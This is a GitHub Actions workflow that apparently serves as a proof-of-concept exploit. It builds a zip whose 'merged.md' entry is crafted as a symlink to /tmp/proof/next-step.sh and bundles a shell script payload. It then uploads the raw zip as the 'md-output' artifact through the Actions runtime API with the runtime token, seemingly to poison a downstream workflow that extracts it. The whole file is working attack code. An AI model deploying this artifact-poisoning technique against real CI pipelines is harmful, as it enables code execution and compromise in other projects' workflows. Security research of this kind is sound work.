name: Producer Bench
on:
  workflow_dispatch:
jobs:
  make:
    runs-on: ubuntu-latest
    steps:
      - name: build malicious zip
        run: |
          python3 - <<'PY'
          import zipfile
          payload = "#!/bin/sh\necho PWNED-BY-ARTIFACT-SYMLINK uid=$(id -u)\n"
          z = zipfile.ZipFile('/tmp/md-output.zip','w', zipfile.ZIP_DEFLATED)
          z.writestr('Linux-default-output.md', payload)
          z.writestr('NR', '1')
          zi = zipfile.ZipInfo('merged.md')
          zi.create_system = 3
          zi.external_attr = (0o120777 << 16)
          z.writestr(zi, '/tmp/proof/next-step.sh')
          z.close()
          PY
          ls -la /tmp/md-output.zip
      - name: upload raw zip as md-output artifact
        run: |
          set -euo pipefail
          RUN_ID=${{ github.run_id }}
          BASE="${ACTIONS_RUNTIME_URL%/}/_apis/pipelines/workflows/$RUN_ID"
          SIZE=$(stat -c%s /tmp/md-output.zip)
          resp=$(curl -sS -X POST "$BASE/artifacts?api-version=6.0-preview" \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"type":"actions_storage","name":"md-output"}')
          echo "CREATE: $resp"
          URL=$(echo "$resp" | jq -r .fileContainerResourceUrl)
          curl -sS -X PUT "$URL?itemPath=md-output" \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
            -H "Content-Type: application/octet-stream" \
            -H "Content-Range: bytes 0-$((SIZE-1))/$SIZE" \
            --data-binary @/tmp/md-output.zip
          echo
          curl -sS -X PATCH "$BASE/artifacts?api-version=6.0-preview&artifactName=md-output" \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"Size\":$SIZE}"
          echo
